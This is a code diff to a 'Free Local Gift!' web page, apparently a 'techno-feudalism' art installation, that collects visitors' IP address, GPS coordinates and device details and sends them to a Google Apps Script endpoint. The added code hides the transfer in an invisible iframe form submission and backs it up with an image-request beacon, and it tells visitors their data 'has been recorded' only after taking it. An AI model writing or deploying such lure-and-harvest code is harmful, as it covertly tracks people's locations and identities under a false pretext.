@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Localised Gift!</title>
+    <title>Free Local Gift!</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -133,6 +133,10 @@
         <p>Thank you for participating in our "techno-feudalism" awareness project.</p>
         <p>Your data has been recorded as part of this art installation.</p>
         <p id="data-value">Your data's estimated black market value: $<span id="market-value">0000</span></p>
+        <div id="debug-info" style="margin-top: 20px; border-top: 1px solid #ddd; padding-top: 10px; font-size: 12px; text-align: left;">
+            <h3>Debug Information (will be removed in final version):</h3>
+            <pre id="debug-details" style="background: #f5f5f5; padding: 10px; overflow: auto; max-height: 150px;"></pre>
+        </div>
     </div>
 
     <div id="error-message">ERROR: Please go back and accept to continue.</div>
@@ -350,28 +354,78 @@
             document.getElementById('gift-screen').style.display = 'block';
         }
 
-        // Send data to Google Sheet
+        // Send data to Google Sheet with better debugging
         function sendDataToSheet(latitude, longitude, marketValue) {
             const timestamp = new Date().toISOString();
             const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
             
-            // Create URL with query parameters
-            let url = `${GOOGLE_SCRIPT_URL}?timestamp=${encodeURIComponent(timestamp)}`;
-            url += `&ip=${encodeURIComponent(userIP)}`;
-            url += `&latitude=${encodeURIComponent(latitude)}`;
-            url += `&longitude=${encodeURIComponent(longitude)}`;
-            url += `&deviceInfo=${encodeURIComponent(userDevice)}`;
-            url += `&mapLink=${encodeURIComponent(mapLink)}`;
-            url += `&marketValue=${encodeURIComponent(marketValue)}`;
+            // Try a completely different approach - using a hidden iframe
+            const debugInfo = document.getElementById('debug-details');
+            debugInfo.innerHTML = "Preparing to send data...\n";
             
-            // Use GET request instead of POST
-            fetch(url, {
-                method: 'GET',
-                mode: 'no-cors',
-                cache: 'no-cache'
-            }).catch(error => {
-                console.error('Error sending data:', error);
-            });
+            // Create iframe form submission approach
+            const iframe = document.createElement('iframe');
+            iframe.name = 'hidden-iframe';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            // Create a form
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = GOOGLE_SCRIPT_URL;
+            form.target = 'hidden-iframe';
+            
+            // Add form fields
+            const addField = (name, value) => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = name;
+                input.value = value;
+                form.appendChild(input);
+            };
+            
+            addField('timestamp', timestamp);
+            addField('ip', userIP);
+            addField('latitude', latitude);
+            addField('longitude', longitude);
+            addField('deviceInfo', userDevice);
+            addField('mapLink', mapLink);
+            addField('marketValue', marketValue);
+            
+            // Add form to document and submit
+            document.body.appendChild(form);
+            
+            debugInfo.innerHTML += `Form created with action: ${GOOGLE_SCRIPT_URL}\n`;
+            debugInfo.innerHTML += `Data being sent:\n`;
+            debugInfo.innerHTML += `- Timestamp: ${timestamp}\n`;
+            debugInfo.innerHTML += `- IP: ${userIP}\n`;
+            debugInfo.innerHTML += `- Location: ${latitude}, ${longitude}\n`;
+            debugInfo.innerHTML += `- Market Value: ${marketValue}\n`;
+            
+            try {
+                form.submit();
+                debugInfo.innerHTML += "Form submitted!\n";
+                
+                // Also try the direct URL approach as backup
+                const url = `${GOOGLE_SCRIPT_URL}?timestamp=${encodeURIComponent(timestamp)}`
+                    + `&ip=${encodeURIComponent(userIP)}`
+                    + `&latitude=${encodeURIComponent(latitude)}`
+                    + `&longitude=${encodeURIComponent(longitude)}`
+                    + `&deviceInfo=${encodeURIComponent(userDevice.substring(0, 100))}`
+                    + `&mapLink=${encodeURIComponent(mapLink)}`
+                    + `&marketValue=${encodeURIComponent(marketValue)}`;
+                
+                debugInfo.innerHTML += "Also trying direct URL approach as backup...\n";
+                
+                // Use a simple image request (most reliable cross-domain method)
+                const img = new Image();
+                img.onload = () => { debugInfo.innerHTML += "Image request completed.\n"; };
+                img.onerror = () => { debugInfo.innerHTML += "Image request failed (this is normal).\n"; };
+                img.src = url;
+                
+            } catch (error) {
+                debugInfo.innerHTML += `Error: ${error.message}\n`;
+            }
         }
     </script>
 </body>
